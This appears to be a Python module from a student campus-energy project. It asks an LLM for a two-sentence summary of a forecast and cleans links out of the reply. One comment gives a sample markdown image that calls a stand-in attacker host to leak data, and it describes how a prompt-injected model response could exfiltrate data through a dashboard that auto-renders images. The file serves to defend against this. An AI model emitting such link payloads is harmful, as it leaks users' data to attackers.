"""
CampusGrid AI: Agent 1 — Plain-English Forecast Summary
Module Owner: Member 2 (Telemetry, Data Engineering & Machine Learning)

Makes exactly one LLM call that writes a short note explaining what is unusual
about tomorrow's forecast. This is the "summarisation" NLP technique the
assignment brief asks for.

The LLM only ever writes the *sentence* — every number quoted in the prompt
comes straight from the forecaster's own output, never from the model's
memory, so it has nothing to invent.
"""

import re
from typing import List, Optional
from src.domain.interfaces.llm import LLMProvider, LLMMessage

# Strips markdown image/link syntax, e.g. ![alt](https://evil.example/leak?x=...), so a
# prompt-injected or compromised LLM response cannot exfiltrate data by having a dashboard
# auto-render an attacker-controlled image/link URL. See red-team TC-S2-06.
_MARKDOWN_LINK_OR_IMAGE_PATTERN = re.compile(r"!?\[[^\]]*\]\([^)]*\)")
_BARE_URL_PATTERN = re.compile(r"https?://\S+", re.IGNORECASE)


def _strip_exfiltration_vectors(text: str) -> str:
    """Removes markdown images/links and bare URLs from LLM-generated text before display."""
    cleaned = _MARKDOWN_LINK_OR_IMAGE_PATTERN.sub("[link removed]", text)
    cleaned = _BARE_URL_PATTERN.sub("[link removed]", cleaned)
    return cleaned


SYSTEM_PROMPT = (
    "You are a campus energy analyst writing a two-sentence briefing note for a "
    "facility manager. You will be given tomorrow's forecast numbers. Summarize only "
    "what is unusual or noteworthy about the day using the exact figures provided. "
    "Do not invent any number that was not given to you. Do not add recommendations "
    "or actions — only describe the forecast."
)


def build_forecast_summary(
    llm_provider: Optional[LLMProvider],
    time_slots: List[str],
    forecast_demand_kw: List[float],
    temperature_series_c: List[float],
    anomaly_indices: List[int],
) -> Optional[str]:
    """
    Returns a two-sentence plain-English forecast summary, or None if no LLMProvider
    was injected (the summary is an enhancement, not a hard dependency of Agent 1).
    """
    if llm_provider is None or not forecast_demand_kw:
        return None

    peak_kw = max(forecast_demand_kw)
    peak_idx = forecast_demand_kw.index(peak_kw)
    peak_slot = time_slots[peak_idx] if peak_idx < len(time_slots) else "unknown"
    avg_kw = sum(forecast_demand_kw) / len(forecast_demand_kw)
    max_temp_c = max(temperature_series_c) if temperature_series_c else None
    anomaly_count = len(anomaly_indices)
    # Formatting None with :.1f raised TypeError here, outside the try below, failing all of Agent 1.
    temp_fact = f"Peak outdoor temperature: {max_temp_c:.1f} C. " if max_temp_c is not None else ""

    facts = (
        f"Average forecast demand: {avg_kw:.1f} kW. "
        f"Peak forecast demand: {peak_kw:.1f} kW at {peak_slot}. "
        f"{temp_fact}"
        f"Number of anomalous (unusually high) intervals flagged: {anomaly_count}."
    )

    messages = [
        LLMMessage(role="system", content=SYSTEM_PROMPT),
        LLMMessage(role="user", content=f"Tomorrow's forecast facts:\n{facts}\n\nWrite the two-sentence summary."),
    ]

    try:
        response = llm_provider.generate(messages, temperature=0.2, max_tokens=150)
        return _strip_exfiltration_vectors(response.content.strip())
    except Exception:
        # The summary is a nice-to-have; a provider outage must never break the forecast itself.
        return None
